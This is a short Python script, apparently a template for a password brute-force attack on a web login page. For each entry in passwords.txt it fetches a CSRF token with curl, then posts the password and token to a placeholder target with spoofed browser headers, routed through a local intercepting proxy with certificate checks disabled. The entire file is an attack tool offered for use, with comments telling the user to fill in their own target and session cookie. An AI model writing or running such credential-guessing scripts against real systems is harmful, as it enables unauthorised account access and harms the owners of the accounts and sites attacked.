#!/usr/bin/python

from subprocess import Popen, PIPE
import requests
with open("passwords.txt") as f:
    for password in f:

        #get CSRF token if you need to
        tokenRequest=Popen(["curl", "-x", "127.0.0.1:8080", "-b", "awesec_session=sessiontokenifyouneedone123", "-k", "https://targetdotsomething/login"], stdin=PIPE, stdout=PIPE, stderr=PIPE)
        tokenResponse=tokenRequest.communicate(b"' stdout")
        tokenResponse =str(tokenResponse[0])

        token=tokenResponse.split("formToken\":\"",1)[1].split("\"",1)[0]
        print(token)
        #token is here, use the same cookie, its a good csrf token.

        URL = 'https://targetdotsomething/login'



        payload = '''
Just write anything here
it will be displayed gloriously in your POST
Like the password here: ''' + password.rstrip() + '''
or just keep writing, it doesnt matter
add the CSRF token if you need to: ''' + token 

        Headers={"Accept":"application/json, text/plain, */*","Origin":"https://targetdotsomething","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36","Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryoloorwhatever6347586","Referer":"https://targetdotsomething/login","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US,en;q=0.9"}

        cookie={"PHP_session":"sessiontokenifyouneedone123"}

        #if you wanna look at this in your intercepting proxy or something
        https_proxy = "https://127.0.0.1:8080"
        http_proxy = "http://127.0.0.1:8080"

        proxyDict = { 
              "http"  : http_proxy, 
              "https" : https_proxy, 
            }



        session = requests.session()
        r = requests.post(URL, data=payload, proxies=proxyDict, headers=Headers, cookies=cookie, verify=False)
